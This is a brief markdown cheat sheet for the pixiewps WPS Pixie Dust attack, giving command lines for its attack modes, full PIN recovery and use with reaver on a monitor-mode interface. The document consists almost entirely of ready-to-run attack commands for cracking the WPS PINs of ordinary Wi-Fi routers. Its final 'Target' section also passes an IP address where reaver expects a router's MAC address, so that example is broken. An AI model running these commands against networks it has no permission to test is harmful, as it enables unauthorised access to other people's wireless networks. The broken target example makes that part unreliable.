# pixiewps CHEATSHEET

## Quick Reference

### Basic Pixie Dust
```bash
pixiewps -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE>
```

### With Small DH Keys
```bash
pixiewps -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE> -S
```

### Attack Modes
```bash
pixiewps --mode 1 -e <PKE> -r <PKR> -s <HASH1> -z <HASH2> -n <NONCE>  # RT/MT/CL
pixiewps --mode 2 -e <PKE> -r <PKR> -s <HASH1> -z <HASH2> -n <NONCE>  # eCos simple
pixiewps --mode 3 -e <PKE> -r <PKR> -7 <M7> -n <NONCE>                # RTL819x
pixiewps --mode 4 -e <PKE> -r <PKR> -s <HASH1> -z <HASH2>             # eCos simplest
```

### Full Recovery
```bash
pixiewps -e <PKE> -r <PKR> -s <HASH1> -z <HASH2> -n <E-NONCE> -m <R-NONCE> -b <BSSID> -7 <M7> -5 <M5>
```

### With Reaver
```bash
# Capture with reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vvv

# Compute PIN
pixiewps -e <PKE> -r <PKR> -s <HASH1> -z <HASH2> -n <NONCE>
```

### Options
```bash
-v              # Verbose output
-S              # Small DH keys
--mode N        # Attack mode
--start MM/YYYY # Time range start
--end MM/YYYY   # Time range end
--force         # Force current time
```

---

## Target: 192.168.1.x

```bash
# Quick Pixie Dust
reaver -i wlan0mon -b 192.168.1.1 -K -vvv
pixiewps -e <captured_PKE> -r <captured_PKR> -s <HASH1> -z <HASH2> -n <NONCE>
```
